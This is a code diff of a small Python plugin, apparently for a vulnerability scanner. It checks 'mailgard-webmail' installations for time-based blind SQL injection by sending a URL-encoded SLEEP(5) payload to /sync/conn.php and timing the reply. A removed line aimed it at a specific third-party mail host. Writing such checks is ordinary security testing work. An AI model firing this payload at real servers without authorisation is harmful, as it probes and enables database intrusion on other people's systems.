@@ -20,15 +20,17 @@ def assign(service, arg):
 
 
 def audit(args):
-    
+
     payload = "/sync/conn.php?token=1&name=admin%27%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29GgwK%29%20AND%20%27VBmy%27=%27VBmy"
     url = args +payload
     start_time = time.time()
     code, head, res, errcode, _ = curl.curl('"%s"' % url)
     if code == 200 and time.time() - start_time > 4:
         security_hole(url)
+        return args
     pass
 
-if __name__ == "__main__":
+
+
+if __name__== '__main__':
     from dummy import *
-    audit(assign('mailgard-webmail', 'http://mail.szjhqh.com/')[1])
